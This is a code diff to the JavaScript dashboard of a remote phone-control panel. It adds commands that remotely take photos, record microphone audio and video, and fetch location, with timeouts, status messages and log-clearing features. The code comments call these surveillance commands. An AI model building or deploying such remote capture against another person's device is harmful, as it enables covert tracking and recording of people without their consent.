@@ -2,9 +2,12 @@
 let lastReceivedLink = "";
 let lastReportTime = 0;
 let isWaitingForFreshData = false;
+let waitingForType = "location"; // "location" | "media"
 let referenceTime = 0;
 let lastLocationTime = parseInt(localStorage.getItem("remote_last_loc_time") || "0");
 let lastUpdateTimestamp = parseInt(localStorage.getItem("remote_last_seen") || "0");
+let lastActivePollingCmd = "";
+let currentRequestId = 0;
 
 function updateFreshness() {
   const el = document.getElementById("lastSeen");
@@ -22,7 +25,7 @@ function updateFreshness() {
   const diffMin = Math.floor(diffSec / 60);
 
   if (diffSec < 60) {
-    el.textContent = "UPDATED: JUST NOW";
+    el.textContent = "UPDATED: NOW";
     el.style.color = "var(--teal)";
     el.style.opacity = "0.7"; // Increased from 0.4 for visibility
     if (dot && !isTerminalTyping) dot.className = "status-dot";
@@ -133,20 +136,28 @@ async function startPolling() {
         if (s.phone_uptime) document.getElementById("uptimeVal").textContent = s.phone_uptime;
       }
 
-      // Check for fresh location link
+      // Check for fresh location/media link
       if (data.location && data.location.link) {
         const reportTime = data.location.updated;
-        // ONLY print to terminal if user is ACTIVELY waiting for a fetch
-        if (isWaitingForFreshData && reportTime > referenceTime) {
-          isWaitingForFreshData = false; 
+        const incomingLink = data.location.link;
+        const isVaultLink = incomingLink.includes("/vault/");
+        const isGpsLink = !isVaultLink;
+
+        // ONLY print to terminal if user is ACTIVELY waiting — and type must match
+        const waitingForGps = isWaitingForFreshData && (waitingForType === "location");
+        const waitingForVault = isWaitingForFreshData && (waitingForType === "media");
+
+        if ((waitingForGps && isGpsLink && reportTime > referenceTime) ||
+            (waitingForVault && isVaultLink && reportTime > referenceTime)) {
+          isWaitingForFreshData = false;
           lastLocationTime = reportTime;
-          lastReceivedLink = data.location.link; // Sync cache
+          lastReceivedLink = incomingLink;
           localStorage.setItem("remote_last_loc_time", lastLocationTime);
-          displayLocation(data.location.link);
+          displayLocation(incomingLink);
         } else {
-          // Just sync the internal timestamp and cache quietly
+          // Sync cache quietly regardless
           lastLocationTime = Math.max(lastLocationTime, reportTime);
-          lastReceivedLink = data.location.link; // Keep cache fresh for failsafe
+          lastReceivedLink = incomingLink;
           localStorage.setItem("remote_last_loc_time", lastLocationTime);
         }
       }
@@ -313,8 +324,8 @@ function renderStatus(msg, state, time, skipTyping = false, details = null, cmdK
       resolve();
     } else {
       let i = 0;
-      // DYNAMIC SPEED: Fast on mobile (5ms) or if queue is large
-      const speed = (window.innerWidth <= 768 || terminalQueue.length > 2) ? 5 : 25;
+      // DYNAMIC SPEED: Fast if queue is large
+      const speed = (terminalQueue.length > 2) ? 5 : 25;
       const timer = setInterval(() => {
         textEl.textContent += msg[i];
         i++;
@@ -352,23 +363,36 @@ function renderLocation(link, time, skipTyping = false) {
     body.appendChild(line);
 
     const textEl = line.querySelector(".t-text");
-    const msg = "MAP DATA ACQUIRED";
+    
+    // Dynamic Intel Type Detection
+    let msg = "MAP DATA ACQUIRED";
+    let linkLabel = "[ OPEN GOOGLE MAPS ]";
+    
+    if (link.includes("/vault/image")) {
+      msg = "PHOTO CAPTURED";
+      linkLabel = "[ SHOW PHOTO ]";
+    } else if (link.includes("/vault/audio")) {
+      msg = "REMOTE AUDIO ACQUIRED";
+      linkLabel = "[ LISTEN TO AUDIO ]";
+    } else if (link.includes("/vault/video")) {
+      msg = "VIDEO FEED ACQUIRED";
+      linkLabel = "[ VIEW VIDEO FEED ]";
+    }
 
     if (skipTyping) {
-      textEl.innerHTML = `${msg}<br><a href="${link}" target="_blank" class="map-link">[ OPEN SATELLITE VIEW ]</a>`;
+      textEl.innerHTML = `${msg}<br><a href="${link}" target="_blank" class="map-link">${linkLabel}</a>`;
       body.scrollTop = body.scrollHeight;
       resolve();
     } else {
       let i = 0;
-      // Speed sync with mobile/queue optimization
-      const speed = (window.innerWidth <= 768 || terminalQueue.length > 2) ? 5 : 35;
+      const speed = (terminalQueue.length > 2) ? 5 : 35;
       const timer = setInterval(() => {
         textEl.textContent += msg[i];
         i++;
         body.scrollTop = body.scrollHeight;
         if (i >= msg.length) {
           clearInterval(timer);
-          textEl.innerHTML += `<br><a href="${link}" target="_blank" class="map-link">[ OPEN GOOGLE MAPS ]</a>`;
+          textEl.innerHTML += `<br><a href="${link}" target="_blank" class="map-link">${linkLabel}</a>`;
           body.scrollTop = body.scrollHeight;
           resolve();
         }
@@ -658,6 +682,13 @@ document.addEventListener("click", function (e) {
   if (dropdown && !dropdown.contains(e.target)) {
     closeDropdown();
   }
+  
+  // Close top left nav menu
+  const tlm = document.getElementById("topLeftMenu");
+  const nd = document.getElementById("navDropdown");
+  if (tlm && nd && !tlm.contains(e.target)) {
+    nd.classList.remove("open");
+  }
 });
 
 /* ── Execute ────────────────────────────────────────────────── */
@@ -695,6 +726,12 @@ function execute() {
   }
   setTimeout(() => execBtn.classList.remove("loading"), 1000);
 
+  // INTERRUPTION LOGIC: If a command is already polling, mark it as interrupted
+  if (isWaitingForFreshData) {
+    setStatus(`${lastActivePollingCmd.toUpperCase()} INTERRUPTED`, "err");
+    isWaitingForFreshData = false;
+  }
+
   // If cmd2 is required but empty
   if (selectedCmd === "speak_text" && !cmd2) {
     setStatus("MESSAGE TEXT REQUIRED", "err");
@@ -702,25 +739,45 @@ function execute() {
     return;
   }
 
-  // If it's a location command, start waiting for a FRESH report
-  if (selectedCmd === "location_share_recent" || selectedCmd === "location_share") {
+  // If it's a surveillance or location command, start waiting for a FRESH report
+  const isLocationCmd = ["location_share_recent", "location_share"].includes(selectedCmd);
+  const isMediaCmd = ["photo_click", "videorecording_on", "microphone_record"].includes(selectedCmd);
+  
+  if (isLocationCmd || isMediaCmd) {
+    const thisRequestId = ++currentRequestId;
     isWaitingForFreshData = true;
-    referenceTime = lastLocationTime; // Only accept coordinates newer than our current latest
-    setStatus(`REQUESTING ${selectedCmdDisplay.toUpperCase()} ...`, "busy");
+    lastActivePollingCmd = selectedCmdDisplay;
+    const pollingName = selectedCmdDisplay.toUpperCase();
+    const isPollingLoc = isLocationCmd;
 
-    // 🛡️ INTELLIGENT FAILSAFE: 7s for Recent, 30s for Live
-    const timeoutMs = (selectedCmd === "location_share_recent") ? 7000 : 30000;
+    waitingForType = isLocationCmd ? "location" : "media"; 
+    referenceTime = lastLocationTime; 
+    let durationLabel = "";
+    if (selectedCmd === "microphone_record") durationLabel = " (30s)";
+    else if (selectedCmd === "videorecording_on") durationLabel = " (15s)";
+    
+    setStatus(`REQUESTING ${pollingName}${durationLabel} ...`, "busy");
+
+    // Increased timeouts to allow for slower network uploads (Prevents premature "FAILED TO ACQUIRE")
+    let timeoutMs = 60000; // Default: 60s
+    if (selectedCmd === "location_share_recent") timeoutMs = 15000;
+    else if (selectedCmd === "photo_click") timeoutMs = 60000;         
+    else if (selectedCmd === "microphone_record") timeoutMs = 120000;   
+    else if (selectedCmd === "videorecording_on") timeoutMs = 150000;   
     
     setTimeout(() => {
-      if (isWaitingForFreshData) {
-        isWaitingForFreshData = false; // Stop waiting for fresh handshake
-        setStatus("COULD NOT GET LIVE LOCATION", "err");
-        
-        if (lastReceivedLink) {
-          setStatus("PRINTING LAST KNOWN LOCATION", "busy");
-          setTimeout(() => displayLocation(lastReceivedLink), 500);
+      if (isWaitingForFreshData && currentRequestId === thisRequestId) {
+        isWaitingForFreshData = false; 
+        if (isPollingLoc) {
+          setStatus("COULD NOT GET LIVE LOCATION", "err");
+          if (lastReceivedLink) {
+            setStatus("PRINTING LAST KNOWN LOCATION", "busy");
+            setTimeout(() => displayLocation(lastReceivedLink), 500);
+          } else {
+            setStatus("NO LOCATION DATA FOUND", "err");
+          }
         } else {
-          setStatus("NO LOCATION DATA FOUND", "err");
+          setStatus(`FAILED TO ACQUIRE ${pollingName}`, "err");
         }
       }
     }, timeoutMs);
@@ -741,7 +798,7 @@ function execute() {
       const isSuccess = text.toLowerCase().includes("ok") || text.toLowerCase().includes("success");
       const time = getTimestamp();
 
-      if (selectedCmd !== "location_share_recent" && selectedCmd !== "location_share") {
+      if (!isLocationCmd && !isMediaCmd) {
         if (isSuccess) {
           setStatus(`${selectedCmdDisplay.toUpperCase()} SUCCESS`, "ok");
           updateLastSuccess(selectedCmd, time);
@@ -751,7 +808,7 @@ function execute() {
       }
     })
     .catch((err) => {
-      if (selectedCmd !== "location_share_recent" && selectedCmd !== "location_share") {
+      if (!isLocationCmd && !isMediaCmd) {
         setStatus(`${selectedCmdDisplay.toUpperCase()} NETWORK ERROR`, "err", err.message, selectedCmd);
       }
     });
@@ -788,7 +845,92 @@ function logout() {
   window.location.href = "/login";
 }
 
-// ── 15-Minute Inactivity Guard ───────────────────────────────
+/* ── Clear Terminal Logs ───────────────────────────────────── */
+function closeConfirm() {
+  const modal = document.getElementById("confirmModal");
+  if (modal) modal.classList.remove("open");
+}
+
+function showConfirm(msg, onConfirm) {
+  const modal = document.getElementById("confirmModal");
+  const msgEl = document.getElementById("confirmMessage");
+  const btn = document.getElementById("confirmBtn");
+  
+  if (!modal || !msgEl || !btn) return;
+  
+  msgEl.innerText = msg;
+  modal.classList.add("open");
+  
+  btn.onclick = () => {
+    onConfirm();
+    closeConfirm();
+  };
+}
+
+/* ── Clear Terminal Logs ───────────────────────────────────── */
+function clearLogs() {
+  showConfirm("PURGE TERMINAL LOGS? THIS ACTION IS IRREVERSIBLE.", () => {
+    const body = document.getElementById("terminalBody");
+    if (!body) return;
+    
+    body.classList.add("terminal-purging");
+    
+    // Wait for animation to finish
+    setTimeout(() => {
+      body.innerHTML = "";
+      localStorage.removeItem("remote_terminal_history");
+      setStatus("TERMINAL LOGS CLEARED", "busy");
+      body.classList.remove("terminal-purging");
+    }, 800);
+  });
+}
+
+/* ── Copy Last 10 Terminal Logs ────────────────────────────── */
+function copyLogs() {
+  const body = document.getElementById("terminalBody");
+  if (!body) return;
+
+  const lines = Array.from(body.querySelectorAll(".t-line"));
+  const last10 = lines.slice(-10);
+
+  if (last10.length === 0) {
+    setStatus("NO LOGS TO COPY", "err");
+    return;
+  }
+
+  const logText = last10.map(line => {
+    const textEl = line.querySelector(".t-text");
+    const timeEl = line.querySelector(".t-time");
+    const text = textEl ? textEl.innerText.trim() : "";
+    const time = timeEl ? timeEl.textContent.trim() : "";
+    // Include any link labels (map/photo/audio)
+    const linkEl = line.querySelector(".map-link");
+    const linkText = linkEl ? ` ${linkEl.textContent.trim()}` : "";
+    return `[${time}] › ${text}${linkText}`;
+  }).join("\n");
+
+  const header = `=== CTRL PANEL — LAST ${last10.length} LOGS ===\n`;
+  const footer = `\n=== END OF LOG — ${new Date().toLocaleString('en-US', { hour12: true })} ===`;
+
+  navigator.clipboard.writeText(header + logText + footer).then(() => {
+    const btn = document.getElementById("copyLogsBtn");
+    if (btn) {
+      btn.style.background = "var(--teal)";
+      btn.style.opacity = "1";
+      btn.style.boxShadow = "0 0 8px var(--teal)";
+      setTimeout(() => {
+        btn.style.background = "";
+        btn.style.opacity = "";
+        btn.style.boxShadow = "";
+      }, 2000);
+    }
+    setStatus("LOGS COPIED TO CLIPBOARD", "ok");
+  }).catch(() => {
+    setStatus("CLIPBOARD ACCESS DENIED", "err");
+  });
+}
+
+// ── 30-Minute Inactivity Guard ───────────────────────────────
 let idleMinutes = 0;
 const resetIdle = () => { idleMinutes = 0; };
 ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'].forEach(evt => 
@@ -797,7 +939,7 @@ const resetIdle = () => { idleMinutes = 0; };
 
 setInterval(() => {
   idleMinutes++;
-  if (idleMinutes >= 15) {
+  if (idleMinutes >= 30) {
     console.warn("Session expired due to inactivity.");
     logout();
   }
